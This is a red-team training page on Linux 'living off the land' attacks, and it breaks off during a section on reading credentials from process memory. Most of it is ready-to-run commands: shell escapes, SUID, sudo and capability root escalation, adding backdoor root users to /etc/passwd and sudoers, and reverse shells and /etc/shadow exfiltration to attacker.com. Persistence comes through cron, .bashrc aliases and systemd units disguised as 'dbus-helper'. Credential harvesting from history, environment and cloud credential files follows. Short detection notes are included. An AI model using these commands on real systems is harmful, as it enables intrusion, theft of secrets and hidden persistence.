---
layout: training-page
title: "Linux Living Off the Land — Red Team Academy"
module: "Living Off the Land"
tags:
  - linux
  - gtfobins
  - living-off-the-land
  - suid
  - sudo
  - t1548.001
  - t1059.004
page_key: "lotl-linux"
render_with_liquid: false
---

# Linux Living Off the Land (LOTL)

Living Off the Land (LOTL) means achieving your red team objectives using tools and binaries already present on the target system — no custom tooling dropped, no suspicious process spawns from foreign executables. When EDR sensors, filesystem integrity monitoring (FIM), or application whitelisting are in play, your own implant binary is often the highest-risk artifact you can introduce. Native OS binaries are signed, whitelisted, expected to run, and already known to defenders — making them ideal weapons.

This page focuses exclusively on **GTFOBins-style abuse** of standard Linux binaries for shell escape, privilege escalation, file I/O, network operations, persistence, and credential access. For general post-exploitation enumeration and lateral movement, see [Linux Post-Exploitation](/post-exploitation/linux-post-exploitation/).

MITRE ATT&CK primary coverage: **T1059.004** (Unix Shell), **T1548.001** (SUID), **T1548.003** (Sudo), **T1068** (Exploitation for Privilege Escalation), **T1005** (Data from Local System), **T1041** (Exfiltration over C2), **T1053.003** (Cron), **T1003** (Credential Dumping)

---

## 1. GTFOBins Overview

[GTFOBins](https://gtfobins.github.io) is the canonical reference for Unix binary abuse. Each entry documents how a binary can be used to:

- **Shell** — spawn an interactive shell
- **Command** — execute arbitrary commands
- **Reverse shell** — call back to an attacker
- **Non-interactive reverse shell** — for environments where PTY allocation fails
- **File read** — read arbitrary files from disk
- **File write** — write to arbitrary file paths
- **SUID** — escalate when the binary has the SUID bit set
- **Sudo** — escalate when listed in sudoers without password
- **Capabilities** — escalate when the binary has Linux capabilities set
- **Limited SUID** — partial escalation (file read only, not full shell)

**Workflow when you land a shell:**

```bash
# === Step 1: Identify what's on the system ===
which python python3 perl ruby awk find vim nano ed curl wget nc ncat openssl
compgen -c | sort -u          # all commands available in PATH

# === Step 2: Check SUID binaries ===
find / -perm -4000 -type f 2>/dev/null

# === Step 3: Check sudo rights ===
sudo -l

# === Step 4: Check capabilities ===
getcap -r / 2>/dev/null

# === Step 5: Cross-reference GTFOBins for each finding ===
# https://gtfobins.github.io/gtfobins/<binary>/
```

---

## 2. Shell / Command Execution via LOL Binaries

**MITRE ATT&CK: T1059.004**

Getting a full interactive shell from restricted environments (rbash, limited sudo, application shells, etc.) using binaries the system already trusts.

> **Scenario:** You've obtained code execution inside a web application running as `www-data`. The shell is limited (`rbash`) and only a handful of binaries are in `PATH`. You need an unrestricted shell without uploading any tool.

### bash / sh

```bash
# === Direct shell spawn (if not already in restricted shell) ===
bash -i                        # interactive bash
/bin/sh -i                     # POSIX shell

# === Bypass rbash by invoking via exec ===
bash --noprofile --norc        # skip profile scripts
exec bash                      # replace restricted shell process

# === Via script (bypasses some PATH restrictions) ===
script /dev/null               # spawn unrestricted shell, output to /dev/null

# === If bash has SUID ===
bash -p                        # preserve effective UID (does not drop privs)
```

### python / python3

```bash
# === Spawn interactive shell ===
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# === os.system alternative ===
python3 -c 'import os; os.system("/bin/bash")'

# === Fully upgrade to TTY after spawn ===
# In the shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo → fg → reset
```

### perl

```bash
# === Shell spawn ===
perl -e 'exec "/bin/bash";'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# === System call ===
perl -e 'system("/bin/bash")'
```

### ruby

```bash
# === Shell spawn ===
ruby -e 'exec "/bin/bash"'
ruby -e 'system("/bin/bash")'

# === If restricted from exec ===
ruby -e 'require "open3"; Open3.popen3("/bin/bash") {|i,o,e,t| }'
```

### awk / nawk / gawk

```bash
# === Shell via awk (common in restricted environments — awk is often allowed) ===
awk 'BEGIN {system("/bin/bash")}'
awk 'BEGIN {cmd="/bin/sh -i"; system(cmd)}'

# === nawk / gawk syntax identical ===
gawk 'BEGIN {system("/bin/bash")}'
```

### find

```bash
# === Execute command via -exec ===
find . -exec /bin/bash \; -quit
find /tmp -name '.*' -exec /bin/sh \;

# === One-liner: find itself as the "file" ===
find / -maxdepth 1 -exec /bin/bash -i \; 2>/dev/null
```

### xargs

```bash
# === Feed /bin/bash into xargs ===
echo "" | xargs -I{} /bin/bash
xargs -a /dev/null /bin/bash
```

### env

```bash
# === env can exec any binary ===
env /bin/bash
env -i /bin/bash --noprofile --norc    # clean environment shell
```

### less / more / man

```bash
# === less: open any file then drop to shell ===
less /etc/hosts
# Inside less: !bash  OR  !/bin/sh

# === more: same mechanism ===
more /etc/hosts
# Inside more: !bash

# === man pages spawn less/more internally ===
man man
# Inside man: !bash
```

### vim / vi

```bash
# === Spawn shell from vim command mode ===
vim -c ':!/bin/bash'           # non-interactive: just runs bash
vim -c ':set shell=/bin/bash' -c ':shell'   # interactive shell

# === From inside vim ===
:!/bin/bash
:set shell=/bin/bash | :shell
:python3 import os; os.system("/bin/bash")

# === vi same syntax ===
vi -c ':!/bin/bash'
```

### nano

```bash
# === nano executes commands via Ctrl+R then Ctrl+X ===
nano
# Ctrl+R → Ctrl+X → /bin/bash

# === or directly with a piped file ===
nano /dev/stdin           # then Ctrl+R Ctrl+X bash
```

### ed

```bash
# === ed is an ancient editor always present on minimal systems ===
ed
# Inside ed:
!bash
# Or:
!/bin/sh -i
```

### pico

```bash
# === pico (alias for nano on many systems) ===
pico
# Ctrl+R → Ctrl+X → /bin/bash
```

**Detection notes:** Shells spawned via interpreters (python, perl, awk) will appear as child processes of the interpreter. Blue teams look for `bash` or `sh` spawned from unexpected parents (`python3`, `awk`, `find`). EDR rules commonly flag `pty.spawn` calls and `exec` syscalls from script interpreters.

---

## 3. SUID Binary Abuse

**MITRE ATT&CK: T1548.001**

When a binary has the SUID bit set and is owned by root, executing it runs with root's effective UID. Misconfigured SUID binaries are one of the most reliable local privilege escalation paths.

> **Scenario:** LinPEAS shows `/usr/bin/find` has the SUID bit set on a hardened server where custom tools are blocked by AppArmor. Using `find`'s `-exec` flag with SUID active grants a root shell with a single command.

### Finding SUID Binaries

```bash
# === Enumerate all SUID binaries ===
find / -perm -4000 -type f 2>/dev/null
find / -perm /4000 -type f 2>/dev/null      # alternate syntax

# === Filter to non-standard locations (outside /bin, /sbin, /usr/bin) ===
find / -perm -4000 -type f 2>/dev/null | grep -Ev '^/(bin|sbin|usr/(bin|sbin))'

# === Check owner and permissions ===
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

### find (SUID)

```bash
# === find with SUID — exec spawns shell as root ===
/usr/bin/find . -exec /bin/bash -p \;
# -p flag: preserve effective UID (bash would otherwise drop SUID privs)

# === Alternative with /bin/sh ===
/usr/bin/find . -exec /bin/sh -p \; -quit
```

### bash (SUID — misconfigured installations)

```bash
# === bash -p respects EUID ===
/bin/bash -p
# whoami → root (EUID=0 even if RUID is www-data)
```

### cp (SUID)

```bash
# === cp with SUID: overwrite /etc/passwd with modified version ===
# 1. Create a new passwd entry (no password for root)
openssl passwd -1 -salt xyz hacked   # generate password hash
echo 'hacker:$1$xyz$<HASH>:0:0:root:/root:/bin/bash' >> /tmp/passwd.new
cp /etc/passwd /tmp/passwd.bak        # backup original
cp /tmp/passwd.new /etc/passwd        # overwrite as root
su hacker                             # login as new root user
```

### vim / vi (SUID)

```bash
# === vim spawns shell with EUID of owner ===
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'
vi -c ':!bash -p'
```

### nano (SUID)

```bash
# === nano with SUID: write to /etc/sudoers ===
nano /etc/sudoers
# Add: youruser ALL=(ALL) NOPASSWD: ALL
# Save → sudo bash
```

### python / python3 (SUID)

```bash
# === python with SUID: setuid then exec ===
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
python -c 'import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'
```

### perl (SUID)

```bash
# === perl with SUID ===
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

### env (SUID)

```bash
# === env with SUID: exec anything as root ===
env /bin/bash -p
```

### nmap (SUID — versions < 5.20)

```bash
# === nmap interactive mode (deprecated, only in old versions) ===
nmap --interactive
# Inside nmap interactive:
!bash -p
```

**Detection notes:** SUID binary execution generates `execve` syscall events with `AT_SECURE` flag set. EDR products alert on shells (`bash`, `sh`) spawned with effective UID 0 but real UID > 0. Auditd rule: `-a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000`.

---

## 4. Sudo Abuse (NOPASSWD Patterns)

**MITRE ATT&CK: T1548.003**

Misconfigured sudoers entries — particularly `NOPASSWD` — allow a low-privilege user to execute specific commands as root without a password. Every binary that can spawn a shell or write files becomes a full root escalation.

> **Scenario:** A developer account has `sudo python3 NOPASSWD` to run deployment scripts. You have a shell as that user. One line of python gives you root.

### Enumerate Sudo Rights

```bash
# === List current user's sudo permissions ===
sudo -l

# === Example output showing exploitable entries ===
# (ALL) NOPASSWD: /usr/bin/python3
# (ALL) NOPASSWD: /usr/bin/vim /var/www/html/*
# (ALL) NOPASSWD: /usr/bin/find

# === If sudo -l requires password but you don't know it ===
cat /etc/sudoers 2>/dev/null          # requires root read perms
cat /etc/sudoers.d/* 2>/dev/null      # drop-in files
```

### vi / vim (sudo)

```bash
sudo vim -c ':!/bin/bash'
sudo vim -c ':set shell=/bin/bash' -c ':shell'

# === If restricted to a specific file path ===
sudo vim /var/log/app.log
# Inside vim: :!/bin/bash
```

### nano (sudo)

```bash
sudo nano
# Ctrl+R → Ctrl+X → /bin/bash
# OR: write to /etc/sudoers directly
sudo nano /etc/sudoers
# Append: lowprivuser ALL=(ALL) NOPASSWD: ALL
```

### python / python3 (sudo)

```bash
# === Direct root shell ===
sudo python3 -c 'import os; os.system("/bin/bash")'

# === More stealthy: setuid then exec ===
sudo python3 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash")'

# === Using pty for full TTY ===
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### perl (sudo)

```bash
sudo perl -e 'exec "/bin/bash";'
sudo perl -e 'system("/bin/bash")'
```

### find (sudo)

```bash
sudo find . -exec /bin/bash \; -quit
sudo find /tmp -name '*.txt' -exec /bin/bash \; -quit
```

### bash (sudo)

```bash
sudo bash                      # trivial — full root shell immediately
sudo /bin/sh                   # POSIX variant
```

### cp (sudo)

```bash
# === Overwrite /etc/passwd or /etc/sudoers ===
echo 'root2::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd
# → su root2 (no password)

# === Or copy attacker's sudoers file ===
echo 'lowprivuser ALL=(ALL) NOPASSWD: ALL' > /tmp/sudoers.new
sudo cp /tmp/sudoers.new /etc/sudoers
```

### tar (sudo)

```bash
# === tar checkpoint exploit ===
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### zip (sudo)

```bash
sudo zip /tmp/nothing.zip /etc/hosts -T --unzip-command="bash -c /bin/bash"
```

### curl (sudo)

```bash
# === Overwrite sudoers via curl file:// ===
# Set up file first:
echo 'lowprivuser ALL=(ALL) NOPASSWD: ALL' > /tmp/sudoers
sudo curl -o /etc/sudoers file:///tmp/sudoers

# === Or fetch from attacker server ===
sudo curl http://attacker.com/sudoers -o /etc/sudoers
```

### wget (sudo)

```bash
sudo wget http://attacker.com/sudoers -O /etc/sudoers
```

### git (sudo)

```bash
# === git hooks execute commands ===
sudo git -C /tmp commit --allow-empty --message="x" \
  --no-edit -n -e                           # with pre-commit hook
# OR simpler:
sudo git help config
# In pager: !/bin/bash
```

### apt / dpkg (sudo)

```bash
# === apt pre/post-invoke hooks ===
sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash"

# === dpkg: custom package with postinst script ===
# (Requires building a .deb — useful when you control the package source)
```

### systemctl (sudo)

```bash
# === Create a transient service that spawns a root shell ===
sudo systemctl set-environment TMPDIR=/tmp
TF=$(mktemp)
echo '[Service]' > $TF
echo 'ExecStart=/bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' >> $TF
echo '[Install]' >> $TF
echo 'WantedBy=multi-user.target' >> $TF
sudo systemctl link $TF
sudo systemctl start $(basename $TF .service)
```

### docker (sudo)

```bash
# === Mount host filesystem into container ===
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash
# → Full root shell with access to host filesystem
```

**Detection notes:** `sudo -l` invocations are logged to `/var/log/auth.log` and via PAM. Shells spawned as root from interpreter processes (python3 → bash) are high-fidelity alerts. Auditd: `-w /etc/sudoers -p wa -k sudoers_changes`.

---

## 5. Linux Capabilities Abuse

**MITRE ATT&CK: T1068**

Linux capabilities divide root privileges into fine-grained units. A binary granted `cap_setuid` can change its UID to 0 without being SUID. Many administrators grant capabilities instead of SUID thinking it is safer — but GTFOBins-capable interpreters make this equally dangerous.

> **Scenario:** A Python3 binary at `/usr/bin/python3.8` has `cap_setuid+ep` set so a monitoring script can drop privileges. You find this during enumeration and use it for instant root.

### Enumerate Capabilities

```bash
# === Recursively scan filesystem for capability-enabled binaries ===
getcap -r / 2>/dev/null

# === Example dangerous output ===
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/perl = cap_setuid+ep
# /usr/bin/ruby = cap_chown+ep
# /usr/bin/vim.basic = cap_dac_read_search+ep
# /usr/sbin/tcpdump = cap_net_raw+ep
# /usr/bin/node = cap_net_bind_service+ep
```

### cap_setuid — python3

```bash
# === cap_setuid: change UID to 0 and exec shell ===
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# === Verify before running ===
getcap /usr/bin/python3.8
# /usr/bin/python3.8 = cap_setuid+ep
```

### cap_setuid — perl

```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

### cap_setuid — ruby

```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

### cap_setuid — node

```bash
node -e "process.setuid(0); require('child_process').spawn('/bin/bash', {stdio: 'inherit'})"
```

### cap_chown — python3

```bash
# === cap_chown: change ownership of any file ===
# Make /etc/shadow readable by current user
python3 -c 'import os; os.chown("/etc/shadow", os.getuid(), os.getgid())'
cat /etc/shadow

# === Or change /etc/sudoers ownership ===
python3 -c 'import os; os.chown("/etc/sudoers", os.getuid(), -1)'
echo 'lowprivuser ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers
```

### cap_chown — ruby

```bash
ruby -e 'require "etc"; File.chown(Process.uid, Process.gid, "/etc/shadow")'
cat /etc/shadow
```

### cap_dac_read_search — vim

```bash
# === cap_dac_read_search: bypass DAC read checks — read any file ===
# vim.basic with this capability can open /etc/shadow directly
vim.basic /etc/shadow

# === Python with cap_dac_read_search ===
python3 -c 'print(open("/etc/shadow").read())'
```

### cap_dac_override — python3

```bash
# === cap_dac_override: bypass all file permission checks (read AND write) ===
# Write to /etc/passwd
python3 -c '
data = open("/etc/passwd").read()
data += "r00t::0:0::/root:/bin/bash\n"
open("/etc/passwd","w").write(data)
'
su r00t    # no password required
```

### cap_net_raw — tcpdump / python3

```bash
# === cap_net_raw: raw socket access — sniff traffic ===
# Capture traffic (credential sniffing on cleartext protocols)
tcpdump -i eth0 -w /tmp/cap.pcap -s 65535

# === Python raw socket for custom traffic analysis ===
python3 -c '
import socket
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0800)
data = s.recvfrom(65535)
print(data)
'
```

### cap_sys_admin

```bash
# === cap_sys_admin: broad administrative capability ===
# Mount filesystems (useful for container escape or accessing protected volumes)
python3 -c '
import ctypes, os
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.mount(b"/dev/sda1", b"/mnt", b"ext4", 0, b"")
'
# Then access /mnt for files from another volume/container layer
```

**Detection notes:** `setuid(0)` syscall from a process not owned by root is a critical alert. `getcap` usage itself may be logged. Falco rule: `proc.name in (python3, perl, ruby) and syscall.type=setuid and user.uid!=0`.

---

## 6. File Read / Write via LOL Binaries

**MITRE ATT&CK: T1005, T1083**

When you cannot cat a file directly (permissions, or need to operate as another user via sudo), many standard binaries can be abused for arbitrary file read and write.

> **Scenario:** You have `sudo dd NOPASSWD` for a legacy backup process. You use `dd` to write your SSH public key to `/root/.ssh/authorized_keys` and gain persistent root SSH access.

### File Read

```bash
# === cat — trivial but often the starting point ===
cat /etc/passwd
cat /etc/shadow     # requires root

# === tee — reads stdin AND writes to file; reads file via redirect ===
tee < /etc/shadow /dev/null   # outputs shadow to terminal as side effect

# === dd — raw block copy ===
dd if=/etc/shadow              # outputs to stdout
dd if=/etc/shadow of=/tmp/shadow.txt    # copy to accessible path

# === openssl enc — encodes and outputs file content ===
openssl enc -in /etc/shadow    # raw output
openssl base64 -in /etc/shadow # base64-encoded output

# === xxd — hex dump of any file ===
xxd /etc/shadow
xxd -r /tmp/shadow.hex /tmp/shadow.txt  # reverse: hex back to binary

# === base64 ===
base64 /etc/shadow              # encode to base64 (exfil-friendly)
base64 -d /tmp/shadow.b64       # decode

# === strings — print printable strings from binary files ===
strings /proc/$(pgrep -n sshd)/mem 2>/dev/null | grep -i password

# === od — octal dump ===
od -c /etc/shadow               # character dump

# === hexdump ===
hexdump -C /etc/shadow

# === python file read ===
python3 -c 'print(open("/etc/shadow").read())'

# === perl file read ===
perl -e 'open(F,"/etc/shadow"); print while(<F>);'

# === awk file read ===
awk '{print}' /etc/shadow

# === sed file read ===
sed '' /etc/shadow

# === head / tail ===
head -n 50 /etc/shadow
tail -n 50 /etc/shadow
```

### File Write

```bash
# === tee — write stdin to file (excellent with sudo) ===
echo 'lowprivuser ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/backdoor
echo 'r00t::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd

# === dd — raw write, byte-perfect ===
# Write attacker's SSH pubkey to root's authorized_keys
sudo dd if=/tmp/authorized_keys of=/root/.ssh/authorized_keys

# === cp — copy a file you control to a privileged location ===
echo 'r00t::0:0:root:/root:/bin/bash' > /tmp/passwd
sudo cp /tmp/passwd /etc/passwd

# === install — copy with permissions (often overlooked in sudoers) ===
sudo install -m 644 /tmp/authorized_keys /root/.ssh/authorized_keys

# === python file write ===
python3 -c 'open("/etc/sudoers","a").write("lowprivuser ALL=(ALL) NOPASSWD: ALL\n")'
# (requires capability or SUID)

# === curl -o — download and write ===
sudo curl http://attacker.com/authorized_keys -o /root/.ssh/authorized_keys

# === wget -O — same as curl ===
sudo wget http://attacker.com/authorized_keys -O /root/.ssh/authorized_keys

# === perl file write ===
perl -e 'open(F,">/tmp/out"); print F "data"; close F;'
```

> **Scenario (SSH key persistence via dd):**
>
> ```bash
> # === Attacker: generate keypair ===
> ssh-keygen -t ed25519 -f /tmp/rtkey -N ""
>
> # === Transfer pubkey to target ===
> cat /tmp/rtkey.pub     # copy this string
>
> # === On target (with sudo dd NOPASSWD) ===
> echo 'ssh-ed25519 AAAA...attacker_key' > /tmp/ak
> sudo mkdir -p /root/.ssh
> sudo chmod 700 /root/.ssh
> sudo dd if=/tmp/ak of=/root/.ssh/authorized_keys
> sudo chmod 600 /root/.ssh/authorized_keys
>
> # === Attacker: SSH in as root ===
> ssh -i /tmp/rtkey root@target
> ```

**Detection notes:** `dd` writing to `/root/.ssh/` or `/etc/passwd` is a high-fidelity FIM alert. Auditd watches: `-w /etc/passwd -p wa`, `-w /root/.ssh -p wa`. `tee` writing to sudoers is similarly logged.

---

## 7. Network / Exfiltration via LOL Binaries

**MITRE ATT&CK: T1041, T1048.003**

Exfiltrating data and establishing command-and-control channels using only binaries present on the target — no Cobalt Strike beacon, no custom implant.

> **Scenario A:** You've read `/etc/shadow` and need to exfil it without touching disk or spawning suspicious processes. Base64-encode it and POST via `curl` to your listener.
>
> **Scenario B:** EDR is blocking unencrypted reverse shells. You establish an encrypted reverse shell using `openssl s_client` — traffic looks like TLS to a web server.

### curl

```bash
# === Simple GET (connectivity check / exfil via URL params) ===
curl http://attacker.com/$(hostname)

# === POST file contents ===
curl -X POST http://attacker.com/exfil \
  -d "data=$(base64 -w0 /etc/shadow)"

# === POST raw file ===
curl -X POST http://attacker.com/upload \
  --data-binary @/etc/shadow \
  -H "Content-Type: application/octet-stream"

# === Download and execute (avoid writing to disk) ===
curl http://attacker.com/payload.sh | bash

# === SFTP exfil (if SSH available on attacker) ===
curl sftp://attacker.com/upload/shadow --upload-file /etc/shadow \
  -u "ftpuser:password"
```

### wget

```bash
# === POST data exfil ===
wget --post-data="shadow=$(base64 -w0 /etc/shadow)" http://attacker.com/recv

# === Download and pipe to bash ===
wget -qO- http://attacker.com/payload.sh | bash

# === Quiet download to /tmp ===
wget -q http://attacker.com/tool -O /tmp/.t && chmod +x /tmp/.t
```

### nc (netcat)

```bash
# === Traditional reverse shell ===
nc -e /bin/bash attacker.com 4444          # BSD netcat with -e
/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1   # pure bash, no nc needed

# === File transfer: receive on attacker ===
nc -lvnp 8888 > received_file.txt          # attacker side
nc attacker.com 8888 < /etc/shadow         # target side

# === Listener → shell (bind shell) ===
nc -lvnp 4444 -e /bin/bash
```

### openssl (encrypted C2 channel)

```bash
# === Attacker: set up encrypted listener ===
# Generate self-signed cert:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=attacker"
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444 | /bin/bash

# === Target: encrypted reverse shell via openssl ===
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 \
  | openssl s_client -quiet -connect attacker.com:4444 > /tmp/s
rm /tmp/s

# === One-liner variant ===
openssl s_client -quiet -connect attacker.com:443 | /bin/bash \
  | openssl s_client -quiet -connect attacker.com:4445
```

### python http.server (exfil staging)

```bash
# === Serve files from target for attacker to pull ===
python3 -m http.server 8080 &
# Attacker: curl http://target:8080/etc/shadow

# === With specific directory ===
cd /tmp && python3 -m http.server 9000
```

### python socket (raw reverse shell)

```bash
python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker.com",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
'
```

### DNS Exfiltration via nslookup / dig

```bash
# === Encode data into DNS queries (attacker controls the nameserver) ===
# Base64-encode sensitive data, chunk into 63-char labels
DATA=$(cat /etc/passwd | base64 -w0)
CHUNK_SIZE=60
ATTACKER_NS="exfil.attacker.com"

echo "$DATA" | fold -w $CHUNK_SIZE | while read chunk; do
  nslookup "${chunk}.${ATTACKER_NS}" > /dev/null 2>&1
done

# === Using dig ===
dig +short "${chunk}.${ATTACKER_NS}" @attacker.com

# === Attacker: capture DNS queries with tcpdump or PowerDNS logging ===
# Each subdomain query contains a chunk of the exfiltrated data
```

> **Full Exfil Scenario (/etc/shadow via curl POST):**
>
> ```bash
> # === On target ===
> # Read shadow, base64 encode (removes newlines for POST safety)
> SHADOW=$(sudo cat /etc/shadow | base64 -w0)
>
> # POST to attacker's netcat or web listener
> curl -sk -X POST https://attacker.com:8443/c \
>   -H "Content-Type: text/plain" \
>   -d "$SHADOW"
>
> # === Attacker: receive with nc ===
> nc -lvnp 8443    # then base64 -d the received data
> ```

**Detection notes:** `curl` and `wget` to non-CDN IPs, especially with POST bodies, are flagged by network DLP. DNS queries with long base64-like subdomains (entropy analysis) are caught by Zeek and modern NDR tools. Outbound connections on uncommon ports (4444, 9001) are immediate alerts.

---

## 8. Persistence via LOL Binaries

**MITRE ATT&CK: T1053.003, T1546.004, T1098.004**

Maintaining access after reboot or session termination using only native OS mechanisms — no backdoor binary on disk.

> **Scenario:** You have a root shell from a SUID exploit that won't survive a reboot. You need persistence that survives system restarts, looks like a legitimate scheduled task, and doesn't require any non-standard binary.

### cron — crontab -e

```bash
# === User-level cron (survives as long as user exists) ===
crontab -l                           # list current crontab
(crontab -l; echo "* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1") | crontab -

# === One-liner: add reverse shell every minute ===
(crontab -l 2>/dev/null; echo "*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -

# === Base64-encoded payload (obfuscates obvious indicators) ===
PAYLOAD='bash -i >& /dev/tcp/attacker.com/4444 0>&1'
B64=$(echo "$PAYLOAD" | base64 -w0)
(crontab -l 2>/dev/null; echo "*/5 * * * * echo $B64 | base64 -d | bash") | crontab -
```

### cron — system-wide files

```bash
# === /etc/cron.d/ (requires write access, but check permissions) ===
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' \
  > /etc/cron.d/.cache

# === /etc/cron.hourly / daily / weekly / monthly ===
cat > /etc/cron.hourly/update-check << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
EOF
chmod +x /etc/cron.hourly/update-check
```

### at command (one-shot delayed execution)

```bash
# === Schedule single execution ===
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" | at now + 1 minute
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" | at 23:00

# === List pending jobs ===
atq
```

### Shell profile modification (.bashrc / .bash_profile / .profile)

```bash
# === Add reverse shell trigger to user's shell init ===
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' >> ~/.bashrc
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' >> ~/.bash_profile

# === Add to /etc/profile (all users, requires root) ===
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' >> /etc/profile

# === Add to /etc/bash.bashrc (system-wide bashrc) ===
echo '(sleep 10; bash -i >& /dev/tcp/attacker.com/4444 0>&1) &' >> /etc/bash.bashrc

# === Alias backdoor (subtler — hijacks common command) ===
echo "alias sudo='bash -i >& /dev/tcp/attacker.com/4444 0>&1 & sudo'" >> ~/.bashrc
```

### systemd user units (if systemd and user lingering enabled)

```bash
# === Create a user-level service unit (no root required if user lingering is on) ===
mkdir -p ~/.config/systemd/user/
cat > ~/.config/systemd/user/dbus-helper.service << 'EOF'
[Unit]
Description=D-Bus session helper

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

systemctl --user enable dbus-helper
systemctl --user start dbus-helper

# === System-level unit (requires root) ===
cat > /etc/systemd/system/network-monitor.service << 'EOF'
[Unit]
Description=Network monitor

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
Restart=always
RestartSec=300

[Install]
WantedBy=multi-user.target
EOF
systemctl enable network-monitor
```

### SSH authorized_keys

```bash
# === Add attacker's SSH key to root's authorized_keys ===
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo 'ssh-ed25519 AAAA...attacker_pubkey attacker@redteam' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# === For the current user ===
echo 'ssh-ed25519 AAAA...attacker_pubkey' >> ~/.ssh/authorized_keys
```

**Detection notes:** New crontab entries generate events in `/var/spool/cron/crontabs/` — FIM covers this. `/etc/cron.d/` modifications are similarly tracked. `.bashrc` modifications logged by auditd (`-w /root/.bashrc -p wa`). Systemd unit file creation in `/etc/systemd/system/` is high-confidence persistence indicator.

---

## 9. Credential Access via LOL Binaries

**MITRE ATT&CK: T1003.008, T1552.001, T1552.003**

Harvesting credentials using only native Linux tools — no mimikatz, no LaZagne, no external tool.

> **Scenario:** You have a root shell on a system running a Java application server. You need credentials from the running process's heap memory. Using `dd` on `/proc/PID/mem` extracts the heap and `strings` finds plaintext passwords — no tools dropped.

### /etc/passwd and /etc/shadow

```bash
# === Read password hashes ===
cat /etc/passwd                        # all users — check for non-standard entries
sudo cat /etc/shadow                   # hashed passwords (requires root)
sudo cat /etc/shadow | grep -v '!\|*' # only accounts with valid passwords

# === Unshadow for offline cracking ===
unshadow /etc/passwd /etc/shadow > /tmp/combined.txt
# Transfer to attacker: john /tmp/combined.txt --wordlist=rockyou.txt
```

### Shell History Files

```bash
# === Current user history ===
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.sh_history

# === All users' history (root) ===
find /home -name '.*history' -exec cat {} \; 2>/dev/null
find /root -name '.*history' -exec cat {} \; 2>/dev/null

# === Search history for passwords typed on CLI ===
grep -i 'pass\|secret\|key\|token\|mysql\|psql\|curl.*-u\|curl.*-H.*auth' \
  ~/.bash_history
```

### Environment Variables

```bash
# === Current process environment ===
printenv                               # all env vars
env                                    # same

# === Other processes' environments (requires appropriate perms) ===
cat /proc/$(pgrep -n apache2)/environ 2>/dev/null | tr '\0' '\n'
cat /proc/1/environ | tr '\0' '\n'     # init/systemd env (root required)

# === Find env vars with credentials across all accessible processes ===
for pid in /proc/[0-9]*/environ; do
  cat "$pid" 2>/dev/null | tr '\0' '\n' | grep -i 'pass\|secret\|key\|token\|db_'
done
```

### Configuration Files (credential hunting)

```bash
# === Web application config files ===
find / -name 'wp-config.php' -exec grep 'DB_PASSWORD\|DB_USER' {} \; 2>/dev/null
find / -name '.env' -exec cat {} \; 2>/dev/null
find / -name 'database.yml' -exec cat {} \; 2>/dev/null
find / -name 'config.php' -exec grep -i 'pass\|secret' {} \; 2>/dev/null

# === SSH private keys ===
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null
find / -name '*.pem' -o -name '*.key' 2>/dev/null | xargs grep -l 'PRIVATE' 2>/dev/null

# === Cloud credential files ===
cat ~/.aws/credentials 2>/dev/null
cat ~/.azure/credentials.json 2>/dev/null
cat ~/.config/gcloud/credentials.db 2>/dev/null
```

### /proc/PID/mem — In-Memory Credential Extraction

```bash
# === Step 1: Identify target process ===
ps aux | grep -E 'java|python|node|ruby|php'   # find processes likely holding creds

# === Step 2: Get memory maps for the process ===
